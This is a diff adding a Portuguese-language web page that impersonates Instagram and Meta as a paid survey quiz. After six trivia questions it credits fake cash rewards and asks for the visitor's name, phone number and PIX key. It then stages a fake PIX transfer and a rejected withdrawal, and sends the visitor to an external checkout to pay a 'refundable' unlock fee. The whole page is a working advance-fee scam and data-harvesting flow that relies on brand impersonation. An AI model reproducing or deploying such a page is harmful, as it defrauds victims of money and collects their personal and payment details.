@@ -1,0 +1,668 @@
+<!DOCTYPE html>  
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Pesquisas - Quiz com Recompensas</title>
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1445215336707610');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1445215336707610&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+    <!-- Smartplayer ConverteAí (adicione uma única vez no head) -->
+    <script type="text/javascript">
+      (function(){
+        var s = document.createElement("script");
+        s.src = "https://scripts.converteai.net/lib/js/smartplayer-wc/v4/sdk.js";
+        s.async = true;
+        document.head.appendChild(s);
+      })();
+    </script>
+
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex; justify-content: center; align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white; border-radius: 20px; padding: 40px 30px;
+            max-width: 400px; width: 100%;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            animation: slideUp 0.5s ease-out; position: relative;
+        }
+
+        @keyframes slideUp { from {opacity:0; transform: translateY(30px);} to {opacity:1; transform: translateY(0);} }
+
+        .wallet-display {
+            position: absolute; top: 15px; right: 20px;
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            color: white; padding: 8px 16px; border-radius: 20px;
+            font-weight: bold; font-size: 16px; display: flex; align-items: center; gap: 5px;
+            box-shadow: 0 4px 15px rgba(240, 147, 251, 0.4);
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse { 0%,100%{transform:scale(1)} 50%{transform:scale(1.05)} }
+
+        .wallet-icon { font-size: 18px; }
+        .wallet-amount { font-size: 18px; }
+
+        /* Página de recompensa */
+        .reward-page { display:none; text-align:center; padding:40px 20px; animation: fadeIn 0.5s ease-out; }
+        .reward-page.active { display:block; }
+        .reward-title { font-size: 32px; color:#262626; margin-bottom:25px; font-weight:700; }
+        .reward-subtitle { color:#666; font-size:18px; margin-bottom:30px; }
+        .reward-amount { font-size:48px; color:#00c851; font-weight:700; margin-bottom:10px; animation: scaleIn 0.5s ease-out; }
+        @keyframes scaleIn { from {transform:scale(0)} to {transform:scale(1)} }
+        .reward-bar { width:100%; height:8px; background:#00c851; border-radius:4px; margin:30px 0; animation: fillBar 1s ease-out forwards; }
+        @keyframes fillBar { from{width:0} to{width:100%} }
+        .reward-info { color:#666; font-size:16px; margin-bottom:25px; }
+        .loading-text { color:#a855f7; font-size:16px; font-weight:500; animation: fadeInOut 2s infinite; }
+        @keyframes fadeInOut { 0%,100%{opacity:.5} 50%{opacity:1} }
+
+        .logos-container { display:flex; justify-content:space-between; align-items:center; margin-bottom:40px; padding:0 20px; margin-top:40px; }
+        .logo { display:flex; align-items:center; gap:8px; }
+        .meta-logo { font-size:18px; color:#1877f2; font-weight:bold; }
+
+        .instagram-logo-container { display:flex; flex-direction:column; align-items:center; gap:5px; }
+        .instagram-icon {
+            width:40px; height:40px;
+            background: linear-gradient(45deg,#f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%);
+            border-radius:12px; display:flex; align-items:center; justify-content:center; position:relative;
+        }
+        .instagram-icon::before { content:''; width:24px; height:24px; border:2px solid white; border-radius:8px; position:absolute; }
+        .instagram-icon::after { content:''; width:8px; height:8px; background:white; border-radius:50%; position:absolute; }
+
+        h1 { font-size:28px; color:#262626; text-align:center; margin-bottom:10px; font-weight:600; margin-top:20px; }
+        .subtitle { color:#666; text-align:center; margin-bottom:30px; font-size:16px; }
+        .input-group { margin-bottom:25px; }
+
+        input[type="text"], input[type="email"], select {
+            width:100%; padding:15px; border:1px solid #dbdbdb; border-radius:12px; font-size:16px; transition:all .3s ease; background:#fafafa;
+        }
+        input[type="text"]:focus, input[type="email"]:focus, select:focus {
+            outline:none; border-color:#a855f7; background:white; box-shadow:0 0 0 3px rgba(168,85,247,.1);
+        }
+        input::placeholder { color:#999; }
+
+        .btn-primary {
+            width:100%; padding:16px; background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);
+            color:white; border:none; border-radius:12px; font-size:16px; font-weight:600; cursor:pointer;
+            transition:all .3s ease; text-transform:uppercase; letter-spacing:1px; margin-top:20px;
+        }
+        .btn-primary:hover { transform: translateY(-2px); box-shadow:0 10px 25px rgba(102,126,234,.4); }
+        .btn-primary:active { transform: translateY(0); }
+
+        .important-note {
+            background:#f0f0f0; padding:12px; border-radius:8px; margin-top:25px; font-size:13px; color:#666; text-align:center; line-height:1.5;
+        }
+        .important-note strong { color:#262626; }
+
+        /* Páginas do Quiz */
+        .page { display:none; animation: fadeIn .5s ease-out; }
+        .page.active { display:block; }
+        @keyframes fadeIn { from{opacity:0; transform:scale(.95)} to{opacity:1; transform:scale(1)} }
+
+        .question-number {
+            background:linear-gradient(135deg,#667eea 0%,#764ba2 100%); color:white; padding:8px 16px; border-radius:20px;
+            display:inline-block; margin-bottom:20px; font-weight:600; margin-top:50px;
+        }
+        .question-text { font-size:20px; color:#262626; margin-bottom:25px; line-height:1.4; }
+
+        .options { display:flex; flex-direction:column; gap:12px; }
+        .option {
+            padding:15px 20px; border:2px solid #dbdbdb; border-radius:12px; cursor:pointer; transition:all .3s ease;
+            background:white; font-size:16px; color:#262626;
+        }
+        .option:hover { border-color:#a855f7; background:#f8f4ff; transform: translateX(5px); }
+        .option.selected { background:linear-gradient(135deg,#667eea 0%,#764ba2 100%); color:white; border-color:#764ba2; }
+        .option.correct { background:linear-gradient(135deg,#00c851 0%,#00a846 100%); color:white; border-color:#00a846; animation: correctPulse .5s ease; }
+        .option.incorrect { background:linear-gradient(135deg,#ff4444 0%,#cc0000 100%); color:white; border-color:#cc0000; animation: shake .5s ease; }
+        @keyframes correctPulse { 0%,100%{transform:scale(1)} 50%{transform:scale(1.05)} }
+        @keyframes shake { 0%,100%{transform:translateX(0)} 25%{transform:translateX(-10px)} 75%{transform:translateX(10px)} }
+
+        .progress-bar { width:100%; height:6px; background:#e0e0e0; border-radius:3px; margin-bottom:30px; overflow:hidden; margin-top:50px; }
+        .progress-fill { height:100%; background:linear-gradient(135deg,#667eea 0%,#764ba2 100%); border-radius:3px; transition: width .5s ease; width:0%; }
+
+        .result-container { text-align:center; padding:20px; margin-top:50px; }
+        .result-icon { font-size:60px; margin-bottom:20px; }
+        .result-title { font-size:24px; color:#262626; margin-bottom:15px; font-weight:600; }
+        .result-description { color:#666; line-height:1.6; margin-bottom:25px; }
+        .final-balance { background:linear-gradient(135deg,#00c851 0%,#00a846 100%); color:white; padding:20px; border-radius:15px; margin:20px 0; font-size:24px; font-weight:bold; }
+
+        .share-buttons { display:flex; gap:10px; justify-content:center; margin-top:20px; }
+        .share-btn { padding:10px 20px; border-radius:8px; border:none; cursor:pointer; font-size:14px; font-weight:600; transition:all .3s ease; }
+        .share-instagram { background: linear-gradient(45deg,#f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%); color:white; }
+        .share-whatsapp { background:#25D366; color:white; }
+        .share-btn:hover { transform: translateY(-2px); box-shadow:0 5px 15px rgba(0,0,0,.2); }
+
+        .btn-secondary { background:#f0f0f0; color:#262626; padding:12px 24px; border:none; border-radius:8px; cursor:pointer; font-weight:600; margin-top:15px; transition:all .3s ease; }
+        .btn-secondary:hover { background:#e0e0e0; }
+
+        /* Etapas finais (apenas estilo visual) */
+        .badge-pill {
+            display:inline-flex; align-items:center; gap:8px; padding:8px 12px;
+            border-radius:20px; background:linear-gradient(135deg,#f093fb 0%, #f5576c 100%); color:#fff; font-weight:700;
+            position:absolute; top:14px; right:18px; box-shadow:0 6px 18px rgba(245,87,108,.35);
+        }
+
+        .mini-card { background:#fafafa; border:1px solid #eee; border-radius:14px; padding:14px 16px; margin-top:16px; }
+        .muted { color:#6b7280; font-size:14px; }
+        .label { font-size:12px; color:#6b7280; margin-bottom:8px; text-transform:uppercase; letter-spacing:.4px; }
+        .grid { display:grid; grid-template-columns: 1fr 1fr; gap:12px; }
+        .pill { padding:10px 12px; border-radius:10px; border:1px solid #e5e7eb; background:#fff; text-align:center; cursor:pointer; }
+        .progress-wrap { margin:18px 0 8px; }
+        .progress-track { height:10px; border-radius:10px; background:#eee; overflow:hidden; }
+        .progress-inner { height:100%; width:0%; background:linear-gradient(135deg,#f093fb 0%, #f5576c 100%); transition:width .3s ease; }
+        .center { text-align:center; }
+        .danger { color:#ef4444; font-weight:800; }
+
+        /* VSL */
+        .vsl-box { background:transparent; border-radius:16px; padding:0; color:#fff; margin:10px 0 18px; }
+        /* garante que o wrapper ocupe 100% */
+        #ifr_68c508df02d156008ff12282_wrapper { width:100%; margin:0 auto; }
+        #ifr_68c508df02d156008ff12282_aspect { position: relative; padding: 56.25% 0 0 0; }
+        #ifr_68c508df02d156008ff12282 {
+          position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+        }
+
+        @media (max-width: 480px){
+          .container{padding:30px 20px}
+          h1{font-size:24px}
+          .question-text{font-size:18px}
+          .reward-amount{font-size:36px}
+          .wallet-display{font-size:14px; padding:6px 12px}
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <!-- Carteira -->
+    <div class="wallet-display" id="walletDisplay" style="display: none;">
+        <span class="wallet-icon">💰</span>
+        <span class="wallet-amount" id="walletAmount">R$ 0,00</span>
+    </div>
+
+    <!-- Página 1 -->
+    <div class="page active" id="page1">
+        <div class="logos-container">
+            <div class="logo"><span class="meta-logo">Meta</span></div>
+            <div class="instagram-logo-container">
+                <div class="instagram-icon"></div>
+            </div>
+        </div>
+        <h1>Bem-vindo(a) ao Instagram Pesquisas</h1>
+        <p class="subtitle">Insira seu nome completo para prosseguir</p>
+        <div class="input-group"><input type="text" id="userName" placeholder="Digite seu Nome" required></div>
+        <button class="btn-primary" onclick="startQuiz()">COMEÇAR PESQUISA</button>
+        <div class="important-note">
+            Importante: A <strong>Meta nunca solicitará sua senha, código de verificação ou acesso à sua conta.</strong>
+        </div>
+    </div>
+
+    <!-- Página 2 -->
+    <div class="page" id="page2">
+        <div class="progress-bar"><div class="progress-fill" style="width: 10%"></div></div>
+        <h1>Informações Básicas</h1>
+        <p class="subtitle">Precisamos de algumas informações para personalizar sua experiência</p>
+        <div class="input-group"><input type="email" id="userEmail" placeholder="Seu e-mail (opcional)"></div>
+        <div class="input-group">
+            <select id="userAge">
+                <option value="">Selecione sua faixa etária</option>
+                <option value="18-24">18-24 anos</option>
+                <option value="25-34">25-34 anos</option>
+                <option value="35-44">35-44 anos</option>
+                <option value="45-54">45-54 anos</option>
+                <option value="55+">55+ anos</option>
+            </select>
+        </div>
+        <button class="btn-primary" onclick="goToQuestion(1)">CONTINUAR</button>
+    </div>
+
+    <!-- Reward -->
+    <div class="reward-page" id="rewardPage">
+        <h2 class="reward-title">Parabéns!</h2>
+        <p class="reward-subtitle">Você ganhou:</p>
+        <div class="reward-amount" id="rewardAmount">R$ 0,00</div>
+        <div class="reward-bar"></div>
+        <p class="reward-info">Adicionado ao seu saldo!</p>
+        <p class="loading-text">Carregando próxima pergunta...</p>
+    </div>
+
+    <!-- Q1 -->
+    <div class="page" id="question1">
+        <div class="progress-bar"><div class="progress-fill" style="width: 25%"></div></div>
+        <span class="question-number">Pergunta 1 de 6</span>
+        <h2 class="question-text">Qual é a empresa dona do Instagram?</h2>
+        <div class="options">
+            <div class="option" onclick="checkAnswer(this, 1, true)">Meta (Facebook)</div>
+            <div class="option" onclick="checkAnswer(this, 1, false)">Google</div>
+            <div class="option" onclick="checkAnswer(this, 1, false)">Microsoft</div>
+            <div class="option" onclick="checkAnswer(this, 1, false)">Apple</div>
+        </div>
+    </div>
+
+    <!-- Q2 -->
+    <div class="page" id="question2">
+        <div class="progress-bar"><div class="progress-fill" style="width: 40%"></div></div>
+        <span class="question-number">Pergunta 2 de 6</span>
+        <h2 class="question-text">Em que ano o Instagram foi lançado?</h2>
+        <div class="options">
+            <div class="option" onclick="checkAnswer(this, 2, false)">2008</div>
+            <div class="option" onclick="checkAnswer(this, 2, true)">2010</div>
+            <div class="option" onclick="checkAnswer(this, 2, false)">2012</div>
+            <div class="option" onclick="checkAnswer(this, 2, false)">2014</div>
+        </div>
+    </div>
+
+    <!-- Q3 -->
+    <div class="page" id="question3">
+        <div class="progress-bar"><div class="progress-fill" style="width: 55%"></div></div>
+        <span class="question-number">Pergunta 3 de 6</span>
+        <h2 class="question-text">Qual é a duração máxima de um Reels?</h2>
+        <div class="options">
+            <div class="option" onclick="checkAnswer(this, 3, false)">30 segundos</div>
+            <div class="option" onclick="checkAnswer(this, 3, false)">60 segundos</div>
+            <div class="option" onclick="checkAnswer(this, 3, true)">90 segundos</div>
+            <div class="option" onclick="checkAnswer(this, 3, false)">120 segundos</div>
+        </div>
+    </div>
+
+    <!-- Q4 -->
+    <div class="page" id="question4">
+        <div class="progress-bar"><div class="progress-fill" style="width: 70%"></div></div>
+        <span class="question-number">Pergunta 4 de 6</span>
+        <h2 class="question-text">Quantas fotos você pode postar em um carrossel?</h2>
+        <div class="options">
+            <div class="option" onclick="checkAnswer(this, 4, false)">5 fotos</div>
+            <div class="option" onclick="checkAnswer(this, 4, true)">10 fotos</div>
+            <div class="option" onclick="checkAnswer(this, 4, false)">15 fotos</div>
+            <div class="option" onclick="checkAnswer(this, 4, false)">20 fotos</div>
+        </div>
+    </div>
+
+    <!-- Q5 -->
+    <div class="page" id="question5">
+        <div class="progress-bar"><div class="progress-fill" style="width: 85%"></div></div>
+        <span class="question-number">Pergunta 5 de 6</span>
+        <h2 class="question-text">Por quanto tempo um Story fica disponível?</h2>
+        <div class="options">
+            <div class="option" onclick="checkAnswer(this, 5, false)">12 horas</div>
+            <div class="option" onclick="checkAnswer(this, 5, true)">24 horas</div>
+            <div class="option" onclick="checkAnswer(this, 5, false)">48 horas</div>
+            <div class="option" onclick="checkAnswer(this, 5, false)">7 dias</div>
+        </div>
+    </div>
+
+    <!-- Q6 -->
+    <div class="page" id="question6">
+        <div class="progress-bar"><div class="progress-fill" style="width: 95%"></div></div>
+        <span class="question-number">Pergunta 6 de 6</span>
+        <h2 class="question-text">Qual recurso permite salvar posts favoritos?</h2>
+        <div class="options">
+            <div class="option" onclick="checkAnswer(this, 6, false)">Arquivar</div>
+            <div class="option" onclick="checkAnswer(this, 6, true)">Coleções</div>
+            <div class="option" onclick="checkAnswer(this, 6, false)">Destaques</div>
+            <div class="option" onclick="checkAnswer(this, 6, false)">Rascunhos</div>
+        </div>
+    </div>
+
+    <!-- Resultados -->
+    <div class="page" id="results">
+        <div class="progress-bar"><div class="progress-fill" style="width: 100%"></div></div>
+        <div class="result-container">
+            <div class="result-icon">🎉</div>
+            <h2 class="result-title">Parabéns, <span id="resultName"></span>!</h2>
+            <p class="result-description">Você completou o quiz do Instagram Pesquisas! </p>
+            <div class="final-balance">💰 Saldo Final: <span id="finalBalance">R$ 0,00</span></div>
+            <p class="result-description">Você acertou <span id="correctCount">0</span> de 6 perguntas e ganhou um total de <span id="totalEarned">R$ 0,00</span>!</p>
+
+            <div class="share-buttons">
+                <button class="share-btn share-instagram" onclick="shareInstagram()">Compartilhar no Instagram</button>
+                <button class="share-btn share-whatsapp" onclick="shareWhatsApp()">Compartilhar no WhatsApp</button>
+            </div>
+
+            <button class="btn-secondary" onclick="restartQuiz()">Jogar Novamente</button>
+            <button class="btn-primary" style="margin-top:14px" onclick="goToFinalFlow()">RECEBER AGORA</button>
+        </div>
+    </div>
+
+    <!-- ================== ETAPAS FINAIS (adicionadas) ================== -->
+
+    <!-- Dados para Pagamento -->
+    <div class="page" id="paymentForm">
+        <div class="badge-pill">💳 R$ <span id="badgeValue">0,00</span></div>
+        <div class="logos-container">
+            <div class="logo"><span class="meta-logo">Meta</span></div>
+            <div class="instagram-logo-container">
+                <div class="instagram-icon"></div>
+            </div>
+        </div>
+
+        <h1>Dados para Pagamento</h1>
+        <p class="subtitle">Preencha os dados abaixo para receber sua recompensa</p>
+
+        <div class="input-group">
+            <label class="label">Nome completo</label>
+            <input type="text" id="pfName" placeholder="Seu nome completo">
+        </div>
+
+        <div class="input-group">
+            <label class="label">Telefone com DDD:</label>
+            <input type="text" id="pfPhone" placeholder="(DDD) Seu Numero">
+        </div>
+
+        <div class="label">Chave PIX:</div>
+        <div class="grid" style="margin-bottom:10px">
+            <div class="pill" onclick="selectPixType('CPF')">CPF</div>
+            <div class="pill" onclick="selectPixType('Celular')">Celular</div>
+            <div class="pill" onclick="selectPixType('E-mail')">E-mail</div>
+            <div class="pill" id="pixTypeSelected" style="pointer-events:none; opacity:.6">Selecione o tipo</div>
+        </div>
+        <div class="input-group">
+            <input type="text" id="pfPix" placeholder="Digite sua chave PIX">
+        </div>
+
+        <p class="muted">Atenção: Preencha os dados do seu Pix corretamente.</p>
+        <button class="btn-primary" onclick="confirmData()">CONFIRMAR DADOS</button>
+        <button class="btn-secondary" onclick="showPage('results')">Voltar</button>
+
+        <div class="muted center" style="margin-top:18px">Todos os direitos reservados © 2025 Instagram from Meta</div>
+    </div>
+
+    <!-- Confirmar seus dados -->
+    <div class="page" id="confirmData">
+        <div class="center" style="margin-top:8px">
+            <div class="instagram-icon" style="margin:0 auto 10px"></div>
+        </div>
+
+        <h1>Confirmar seus dados</h1>
+        <p class="subtitle">Os dados informados estão corretos?</p>
+
+        <div class="mini-card">
+            <div class="label">Nome completo:</div>
+            <div id="cdName">—</div>
+
+            <div class="label" style="margin-top:10px">Telefone com DDD:</div>
+            <div id="cdPhone">—</div>
+
+            <div class="label" style="margin-top:10px">Chave PIX:</div>
+            <div id="cdPix">—</div>
+        </div>
+
+        <button class="btn-primary" onclick="startProcessing()">SIM, CONFIRMAR</button>
+        <button class="btn-secondary" onclick="showPage('paymentForm')">Não, quero alterar</button>
+    </div>
+
+    <!-- Conectando ao Sistema Pix -->
+    <div class="page" id="processing">
+        <div class="center" style="margin-top:8px">
+            <div class="instagram-icon" style="margin:0 auto 10px"></div>
+        </div>
+
+        <h1>Conectando ao Sistema Pix...</h1>
+
+        <div class="progress-wrap">
+            <div class="progress-track"><div class="progress-inner" id="procBar"></div></div>
+        </div>
+        <div class="muted center" id="procPct">0%</div>
+
+        <div class="mini-card" style="margin-top:16px">
+            <div class="label">Detalhes da Transação</div>
+            <div>Valor: <strong id="procValue">R$ 0,00</strong></div>
+            <div>Chave Pix: <strong id="procPix">—</strong></div>
+            <div>ID da Transação: <strong id="procId">PIX000000</strong></div>
+        </div>
+
+        <div class="muted" style="margin-top:10px">
+            O processamento pode levar até 2 minutos. Por favor, aguarde.
+        </div>
+    </div>
+
+    <!-- Saque Rejeitado -->
+    <div class="page" id="rejected">
+        <div class="center" style="margin-top:8px">
+            <div class="instagram-icon" style="margin:0 auto 10px"></div>
+        </div>
+        <h1 class="danger" style="text-align:center; margin-top:10px">Saque rejeitado</h1>
+        <p class="subtitle">Conta ainda não foi verificada</p>
+        <p class="muted center">Você será redirecionado em <span id="rejTimer">5</span> segundos...</p>
+    </div>
+
+    <!-- Obrigado / Receber Agora -->
+    <div class="page" id="thanks">
+        <div class="badge-pill">💳 R$ <span id="badgeValue2">0,00</span></div>
+        <div class="logos-container">
+            <div class="logo"><span class="meta-logo">Meta</span></div>
+            <div class="instagram-logo-container">
+                <div class="instagram-icon"></div>
+            </div>
+        </div>
+
+        <h1 class="center" style="margin-top:10px">Obrigado por participar!</h1>
+        <p class="subtitle">Suas respostas foram registradas com sucesso.</p>
+        <div class="final-balance" style="margin-top:10px; text-align:center;">
+            Saldo Final: <span id="finalDisplay2">R$ 0,00</span>
+        </div>
+        <button class="btn-primary" onclick="goToVSL()">RECEBER AGORA</button>
+
+        <div class="muted center" style="margin-top:18px">Todos os direitos reservados © 2025 Instagram from Meta</div>
+    </div>
+
+    <!-- VSL (última etapa) -->
+    <div class="page" id="vsl">
+        <h1 class="center">DESBLOQUEIO DE SALDO</h1>
+        <p class="subtitle center" id="vslHello">, veja como liberar seu saque assistindo ao vídeo.</p>
+
+        <div class="vsl-box">
+          <!-- ======= SUA VSL CONVERTEAÍ EMBED ======= -->
+          <div id="ifr_68c508df02d156008ff12282_wrapper" style="margin: 0 auto; width: 100%;">
+            <div style="position: relative; padding: 56.25% 0 0 0;" id="ifr_68c508df02d156008ff12282_aspect">
+              <iframe
+                id="ifr_68c508df02d156008ff12282"
+                src="about:blank"
+                frameborder="0"
+                allowfullscreen
+                referrerpolicy="origin"
+                allow="autoplay; clipboard-write; encrypted-media; picture-in-picture"
+                style="position:absolute; top:0; left:0; width:100%; height:100%;"
+                onload="this.onload=null; this.src='https://scripts.converteai.net/bddf52f0-d854-42a8-9e2f-fe2a2cdcabd1/players/68c508df02d156008ff12282/v4/embed.html' + (location.search||'?') + '&vl=' + encodeURIComponent(location.href)">
+              </iframe>
+            </div>
+          </div>
+          <!-- ======================================= -->
+        </div>
+
+        <div class="mini-card">
+            <div class="grid">
+                <div>
+                    <div class="label">Valor reembolsável</div>
+                    <div class="muted">Você recebe os <span id="reembValue">R$ 0,00</span> de volta após finalizar esta etapa</div>
+                </div>
+                <div>
+                    <div class="label">Garantia de segurança</div>
+                    <div class="muted">Seu “pagamento” é simulado nesta demonstração.</div>
+                </div>
+            </div>
+        </div>
+
+        <button class="btn-primary" onclick="window.location.href='https://pedidosgarantido.online/checkout/cmfhw7lhq01oxd23dgmb3rqez?offer=S0N3NFC'">CLIQUE AQUI PARA RESGATAR</button>
+    </div>
+</div>
+
+<script>
+    let balance = 0;
+    let correctAnswers = 0;
+    let currentQuestion = 0;
+    const rewardValues = [18.28, 29.55, 35.85, 48.50, 51.10, 38.10];
+
+    function formatCurrency(value){ return 'R$ ' + value.toFixed(2).replace('.', ','); }
+    function updateWallet(){ document.getElementById('walletAmount').textContent = formatCurrency(balance); }
+
+    function startQuiz(){
+        const userName = document.getElementById('userName').value;
+        if (userName.trim() === '') { alert('Por favor, insira seu nome para continuar'); return; }
+        localStorage.setItem('userName', userName);
+        document.getElementById('walletDisplay').style.display = 'flex';
+        updateWallet();
+        showPage('page2');
+    }
+
+    function showPage(pageId){
+        const pages = document.querySelectorAll('.page');
+        const rewardPage = document.querySelector('.reward-page');
+        pages.forEach(p=>p.classList.remove('active'));
+        rewardPage.classList.remove('active');
+        document.getElementById(pageId).classList.add('active');
+    }
+
+    function goToQuestion(n){
+        if (n===1){
+            const age = document.getElementById('userAge').value;
+            if (age===''){ alert('Por favor, selecione sua faixa etária'); return; }
+        }
+        showPage('question'+n);
+    }
+
+    function checkAnswer(el, qn, ok){
+        const options = el.parentElement.querySelectorAll('.option');
+        options.forEach(o=>{ o.style.pointerEvents='none'; });
+
+        if(ok){
+            el.classList.add('correct');
+            correctAnswers++;
+            const reward = rewardValues[qn-1];
+            balance += reward; updateWallet();
+            setTimeout(()=>{ showRewardPage(reward, qn); }, 1000);
+        }else{
+            el.classList.add('incorrect');
+            setTimeout(()=>{ goToNextQuestion(qn); }, 1500);
+        }
+    }
+
+    function showRewardPage(reward, qn){
+        document.getElementById('rewardAmount').textContent = formatCurrency(reward);
+        document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
+        document.querySelector('.reward-page').classList.add('active');
+        setTimeout(()=>{ goToNextQuestion(qn); }, 3000);
+    }
+
+    function goToNextQuestion(n){
+        if (n < 6){ showPage('question'+(n+1)); }
+        else { showResults(); }
+    }
+
+    function showResults(){
+        const userName = localStorage.getItem('userName') || '';
+        document.getElementById('resultName').textContent = userName;
+        document.getElementById('finalBalance').textContent = formatCurrency(balance);
+        document.getElementById('totalEarned').textContent = formatCurrency(balance);
+        document.getElementById('correctCount').textContent = correctAnswers;
+        showPage('results');
+    }
+
+    function shareInstagram(){ alert('Funcionalidade de compartilhamento será implementada em breve!'); }
+    function shareWhatsApp(){
+        const text = `🎉 Completei o Quiz do Instagram Pesquisas!\n💰 Ganhei ${formatCurrency(balance)}!\n✅ Acertei ${correctAnswers} de 6 perguntas!`;
+        const url = 'https://wa.me/?text=' + encodeURIComponent(text);
+        window.open(url, '_blank');
+    }
+
+    function restartQuiz(){
+        balance = 0; correctAnswers = 0; currentQuestion = 0;
+        document.getElementById('userName').value = '';
+        document.getElementById('userEmail').value = '';
+        document.getElementById('userAge').value = '';
+        document.getElementById('walletDisplay').style.display = 'none';
+        document.querySelectorAll('.option').forEach(opt=>{ opt.classList.remove('correct','incorrect','selected'); opt.style.pointerEvents='auto'; });
+        updateWallet(); showPage('page1');
+    }
+
+    /* ====== Fluxo Final ====== */
+    function goToFinalFlow(){
+        document.getElementById('badgeValue').textContent = formatCurrency(balance).replace('R$ ','');
+        document.getElementById('badgeValue2').textContent = formatCurrency(balance).replace('R$ ','');
+        document.getElementById('finalDisplay2').textContent = formatCurrency(balance);
+        showPage('paymentForm');
+    }
+
+    let selectedPixType = '';
+    function selectPixType(type){
+        selectedPixType = type;
+        const pill = document.getElementById('pixTypeSelected');
+        pill.textContent = type + ' selecionado';
+    }
+
+    function confirmData(){
+        const name = (document.getElementById('pfName').value || '').trim();
+        const phone = (document.getElementById('pfPhone').value || '').trim();
+        const pix = (document.getElementById('pfPix').value || '').trim();
+        if(!name || !phone || !pix || !selectedPixType){ alert('Preencha todos os campos e selecione o tipo de chave PIX.'); return; }
+        document.getElementById('cdName').textContent = name;
+        document.getElementById('cdPhone').textContent = phone;
+        document.getElementById('cdPix').textContent = pix;
+        showPage('confirmData');
+    }
+
+    function randomTxnId(){ return 'PIX' + Math.floor(100000 + Math.random()*900000); }
+
+    function startProcessing(){
+        document.getElementById('procValue').textContent = formatCurrency(balance);
+        document.getElementById('procPix').textContent = document.getElementById('pfPix').value;
+        document.getElementById('procId').textContent = randomTxnId();
+        showPage('processing');
+
+        let pct = 0;
+        const bar = document.getElementById('procBar');
+        const pctEl = document.getElementById('procPct');
+        const timer = setInterval(()=>{
+            pct = Math.min(100, pct + Math.floor(Math.random()*12)+4);
+            bar.style.width = pct + '%';
+            pctEl.textContent = pct + '%';
+            if(pct >= 100){
+                clearInterval(timer);
+                showRejectedThenThanks();
+            }
+        }, 500);
+    }
+
+    function showRejectedThenThanks(){
+        showPage('rejected');
+        let t = 5;
+        const el = document.getElementById('rejTimer');
+        el.textContent = t;
+        const iv = setInterval(()=>{
+            t--; el.textContent = t;
+            if(t<=0){ clearInterval(iv); showPage('thanks'); }
+        }, 1000);
+    }
+
+    function goToVSL(){
+        const userName = localStorage.getItem('userName') || '';
+        const hello = `${userName ? userName + ', ' : ''}veja como liberar seu saque assistindo ao vídeo.`;
+        document.getElementById('vslHello').textContent = hello;
+
+        const reemb = 15.57;
+        document.getElementById('reembValue').textContent = formatCurrency(reemb);
+        showPage('vsl');
+    }
+</script>
+</body>
+</html>
